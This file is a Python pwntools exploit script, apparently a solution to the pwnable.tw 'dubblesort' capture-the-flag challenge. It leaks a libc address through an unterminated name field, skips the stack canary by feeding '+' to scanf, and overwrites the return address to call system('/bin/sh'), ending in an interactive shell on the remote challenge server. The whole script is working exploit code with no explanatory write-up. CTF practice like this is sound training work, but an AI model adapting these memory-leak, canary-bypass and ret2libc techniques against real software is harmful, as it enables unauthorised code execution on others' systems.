#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
#context.log_level = 'debug'

elf  = ELF('./dubblesort')
libc = ELF('./libc_32.so.6')

# Memory locations
bin_sh = elf.bss() + 0x100

# Byte sequence alias
A4 = 4 * b'A'


def main():
    proc = remote('chall.pwnable.tw', 10101)
    #proc = process(['./ld_32-2.23.so', './dubblesort'], env={'LD_PRELOAD': './libc_32.so.6'})
    #log.debug('You may attatch this process to gdb now.')
    #raw_input()

    # Develop your exploit here
    proc.recvuntil('What your name :')
    proc.send(A4 * 6 + b'A')  # extra A to overwrite that fucking \x00 byte

    proc.recvuntil('Hello ' + 'AAAA' * 6)
    libc_data = u32(proc.recv(4)) - ord('A')
    libc_base = libc_data - (0xf7fc1000 - 0xf7e11000)
    libc_system = libc_base + libc.sym['system']
    libc_bin_sh = libc_base + list(libc.search(b'/bin/sh'))[0]

    log.info('libc data start: {}'.format(hex(libc_data)))
    log.info('libc base: {}'.format(hex(libc_base)))
    log.info('system@libc: {}'.format(hex(libc_system)))
    log.info('bin_sh@libc: {}'.format(hex(libc_bin_sh)))

    proc.recvuntil('sort :')
    proc.sendline(str(35).encode())


    payload = []
    for i in range(32):
        payload.append(0x30678 if i < 24 else 0xf0000000)
    payload.append(libc_system)  # ret
    payload.append(libc_bin_sh)  # system()'s ret addr
    payload.append(libc_bin_sh)  # system()'s 1st arg

    for i in range(35):
        proc.recvuntil('number : ')
        if i == 24:
            proc.sendline(b'+')
        else:
            proc.sendline(str(payload[i]).encode())

    # canary:  0xffa7fcfc ◂— 0x23c04d00
    proc.interactive()


if __name__ == '__main__':
    main()
